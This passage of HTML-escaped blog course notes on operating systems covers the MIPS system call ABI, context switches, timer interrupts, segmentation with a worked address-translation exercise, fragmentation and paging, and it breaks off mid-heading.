    &lt;a href=&#34;#application-binary-interface&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;System call number in v0&lt;/li&gt;
&lt;li&gt;First four arguments in a0, a1, a2, a3&lt;/li&gt;
&lt;li&gt;Remaining arguments passed on the stack&lt;/li&gt;
&lt;li&gt;Success/fail in a3 and return value/error code in v0&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;system-call-numbering&#34; &gt;System Call Numbering
&lt;span&gt;
    &lt;a href=&#34;#system-call-numbering&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Defined in &lt;code&gt;kern/include/kern/syscall.h&lt;/code&gt;&lt;/p&gt;
&lt;h3 id=&#34;execution-contexts&#34; &gt;Execution Contexts
&lt;span&gt;
    &lt;a href=&#34;#execution-contexts&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;The environment where functions execute including their
arguments, local variables, memory.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Three types of contexts: Application, kernel, interrupt.&lt;/li&gt;
&lt;li&gt;Context transitions
&lt;ul&gt;
&lt;li&gt;Context switch: a transition between contexts&lt;/li&gt;
&lt;li&gt;Thread switch: a transition between threads&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;application-stack&#34; &gt;Application Stack
&lt;span&gt;
    &lt;a href=&#34;#application-stack&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Stack made up of frames that contain locals, arguments, and spilled registers. _start frame.&lt;/p&gt;
&lt;h4 id=&#34;context-switch-user-to-kernel&#34; &gt;Context Switch User to Kernel
&lt;span&gt;
    &lt;a href=&#34;#context-switch-user-to-kernel&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;common_exception saves trapframe of the application context to the kernel stack&lt;/li&gt;
&lt;li&gt;mips_trap decodes the trapframe and the syscall&lt;/li&gt;
&lt;li&gt;syscall decodes arguments and calls sys_write&lt;/li&gt;
&lt;li&gt;syscall stores return value and error into trapframe&lt;/li&gt;
&lt;li&gt;common_exception restores the application context&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;preemption&#34; &gt;Preemption
&lt;span&gt;
    &lt;a href=&#34;#preemption&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Can preempt a process when kernel gets control&lt;/li&gt;
&lt;li&gt;Vector controls through system calls and etc.&lt;/li&gt;
&lt;li&gt;Periodic timer&lt;/li&gt;
&lt;li&gt;Device interrupt&lt;/li&gt;
&lt;li&gt;Changing the running process is called context switch&lt;/li&gt;
&lt;li&gt;Processes can vector control to kernel through exceptions and I/O&lt;/li&gt;
&lt;li&gt;Changing the running process is called a context switch&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;process-context-switch&#34; &gt;Process Context Switch
&lt;span&gt;
    &lt;a href=&#34;#process-context-switch&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Process Control Block&lt;/li&gt;
&lt;li&gt;Save state into first processes&amp;rsquo; PCB&lt;/li&gt;
&lt;li&gt;Reload state from other processes&amp;rsquo; PCB&lt;/li&gt;
&lt;li&gt;Save state into other processes&amp;rsquo; PCB&lt;/li&gt;
&lt;li&gt;Reload state from first processes&amp;rsquo;s PCB&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;timer-interrupt&#34; &gt;Timer Interrupt
&lt;span&gt;
    &lt;a href=&#34;#timer-interrupt&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Like before, except EX_IRQ from timer means&lt;/li&gt;
&lt;li&gt;mainbus_interrupt&lt;/li&gt;
&lt;li&gt;timer_interrupt&lt;/li&gt;
&lt;li&gt;thread_yield to pick next thread&lt;/li&gt;
&lt;li&gt;thread_switch to save kernel thread state and restore thread state&lt;/li&gt;
&lt;li&gt;switchframe&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;virtual-memory-hardware&#34; &gt;Virtual Memory Hardware
&lt;span&gt;
    &lt;a href=&#34;#virtual-memory-hardware&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;h3 id=&#34;sharing-memory-issues&#34; &gt;Sharing Memory Issues
&lt;span&gt;
    &lt;a href=&#34;#sharing-memory-issues&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Protection
&lt;ul&gt;
&lt;li&gt;Bug in one process corrupts memory in another&lt;/li&gt;
&lt;li&gt;Need to also protect against observing other&amp;rsquo;s memory&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Transparency
&lt;ul&gt;
&lt;li&gt;A process shouldn’t require particular physical memory bits&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Resource exhaustion
&lt;ul&gt;
&lt;li&gt;Sum of all processors sizes &amp;gt; physical memory&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;virtual-memory-goals&#34; &gt;Virtual Memory Goals
&lt;span&gt;
    &lt;a href=&#34;#virtual-memory-goals&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Applications don&amp;rsquo;t see physical memory, only virutal addresses&lt;/li&gt;
&lt;li&gt;The Memory-Management Unit  (hardware) relocates each load
&lt;ul&gt;
&lt;li&gt;The MMU is usually patrt of the CPU&lt;/li&gt;
&lt;li&gt;Accessed w. privileged instructions (e.g., load bound reg)&lt;/li&gt;
&lt;li&gt;Translates from virtual to physical addresses&lt;/li&gt;
&lt;li&gt;Gives per-process view of memory called address space&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Prevents one app from messing with another’s memory&lt;/li&gt;
&lt;li&gt;Allows programs to see more memory than exists (relocate memory accesses to disk)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;virtual-memory-advantages&#34; &gt;Virtual Memory Advantages
&lt;span&gt;
    &lt;a href=&#34;#virtual-memory-advantages&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Can re-locate program while running&lt;/li&gt;
&lt;li&gt;Partially run in memory and on disk&lt;/li&gt;
&lt;li&gt;Idle processes&amp;rsquo; memory written to disk so that other processes can read&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;load-time-linking&#34; &gt;Load-time Linking
&lt;span&gt;
    &lt;a href=&#34;#load-time-linking&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Linker patches addresses of symbols like printf&lt;/li&gt;
&lt;li&gt;How to enforce protection&lt;/li&gt;
&lt;li&gt;How to move once already in memory (Consider: data pointers)&lt;/li&gt;
&lt;li&gt;What if no contiguous free region fits program?&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;base--bound-register&#34; &gt;base + bound register
&lt;span&gt;
    &lt;a href=&#34;#base--bound-register&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Two special privileged registers: base and bound&lt;/li&gt;
&lt;li&gt;When loading/storing,
&lt;ul&gt;
&lt;li&gt;Check 0 ≤ virtual address &amp;lt; bound, else trap to kernel&lt;/li&gt;
&lt;li&gt;Physical address = virtual address + base&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;To move proces in memory, change base register&lt;/li&gt;
&lt;li&gt;OS must reload base and bound register on context switch&lt;/li&gt;
&lt;li&gt;Need to segment memory to avoid
&lt;ul&gt;
&lt;li&gt;expensive process growth&lt;/li&gt;
&lt;li&gt;sharing code/data&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;segmentation&#34; &gt;Segmentation
&lt;span&gt;
    &lt;a href=&#34;#segmentation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Each process has may base/bound regs. Address space is built from many segments. Share/protect memory at segment granularity. Segment is specified in a virtual address.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Segment table
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;[Seg]&lt;/th&gt;
          &lt;th&gt;base&lt;/th&gt;
          &lt;th&gt;bounds&lt;/th&gt;
          &lt;th&gt;rw&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;0&lt;/td&gt;
          &lt;td&gt;0x4000&lt;/td&gt;
          &lt;td&gt;0x6ff&lt;/td&gt;
          &lt;td&gt;10&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;1&lt;/td&gt;
          &lt;td&gt;0x0000&lt;/td&gt;
          &lt;td&gt;0x4ff&lt;/td&gt;
          &lt;td&gt;11&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;2&lt;/td&gt;
          &lt;td&gt;0x3000&lt;/td&gt;
          &lt;td&gt;0xfff&lt;/td&gt;
          &lt;td&gt;11&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;3&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;&lt;/td&gt;
          &lt;td&gt;00&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;Virtual address indicates segment and an offset
&lt;ul&gt;
&lt;li&gt;top bits of addr corresponds to 0-index row/segment in segment table, low bits select offset&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;details&gt;
&lt;summary&gt;segment exercises: 0x0240, 0x1108, 0x265c, 0x3002, 0x1600&lt;/summary&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;0x0240&lt;/span&gt; --&amp;gt; &lt;span style=&#34;color:#3677a9&#34;&gt;0x4240&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;0x1108&lt;/span&gt; --&amp;gt; &lt;span style=&#34;color:#3677a9&#34;&gt;0x0108&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;0x265c&lt;/span&gt; --&amp;gt; &lt;span style=&#34;color:#3677a9&#34;&gt;0x365c&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;0x3002&lt;/span&gt; --&amp;gt; EXCEPTION
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#3677a9&#34;&gt;0x1600&lt;/span&gt; --&amp;gt; OUT OF BOUNDS SINCE &lt;span style=&#34;color:#3677a9&#34;&gt;0x0600&lt;/span&gt; &amp;gt; &lt;span style=&#34;color:#3677a9&#34;&gt;0x04ff&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/details&gt;
&lt;p&gt;If the segment is invalid (not in table or has invalid rw bits), an exception is thrown.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Requires translation hardware which could limit performance&lt;/li&gt;
&lt;li&gt;Segments not exactly transparent to program&lt;/li&gt;
&lt;li&gt;Segments need contiguous bytes of physical memory&lt;/li&gt;
&lt;li&gt;Leads to fragmentation&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;fragmentation&#34; &gt;Fragmentation
&lt;span&gt;
    &lt;a href=&#34;#fragmentation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;The inability to use free memory.&lt;/p&gt;
&lt;h4 id=&#34;external-fragmentation&#34; &gt;External Fragmentation
&lt;span&gt;
    &lt;a href=&#34;#external-fragmentation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Free memory between segments that is too small to be used&lt;/p&gt;
&lt;h4 id=&#34;internal-fragmentation&#34; &gt;Internal Fragmentation
&lt;span&gt;
    &lt;a href=&#34;#internal-fragmentation&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;Space inside a segment that was allocated for the stack; internal waste.&lt;/p&gt;
&lt;h3 id=&#34;paging&#34; &gt;Paging
&lt;span&gt;
    &lt;a href=&#34;#paging&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Divide memory up into small pages
&lt;ul&gt;
&lt;li&gt;Map virtual pages to physical pages. Each process has separate mapping&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Certain operations give control back to OS
&lt;ul&gt;
&lt;li&gt;writes to read-only pages&lt;/li&gt;
&lt;li&gt;invalid pages&lt;/li&gt;
&lt;li&gt;OS can change mapping&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Accessed and dirty bits&lt;/li&gt;
&lt;li&gt;Cache control&lt;/li&gt;
&lt;li&gt;Pages eliminates external fragmentation and pages are small enough that average internal fragmentation is .5 pages per &amp;ldquo;segment&amp;rdquo;&lt;/li&gt;
&lt;li&gt;Pages have a fixed size. X KB
&lt;ul&gt;
&lt;li&gt;log2(X) = bits required for the page offset&lt;/li&gt;
&lt;li&gt;Least significant 12 bits are the offset when page size is 4KB&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Each process has a page table that maps Virtual Page Numbers to Physical Page Numbers&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img src=&#34;https://blog.elijahlopez.ca/images/cs-350/pages.webp&#34; alt=&#34;pages table&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;mmus&#34; &gt;MMUs
&lt;span&gt;
    &lt;a href=&#34;#mmus&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Memory Management Units&lt;/p&gt;
&lt;h3 id=&#34;hardware-managed-mmu&#34; &gt;Hardware Managed MMU
&lt;span&gt;
    &lt;a href=&#34;#hardware-managed-mmu&#34;&gt;
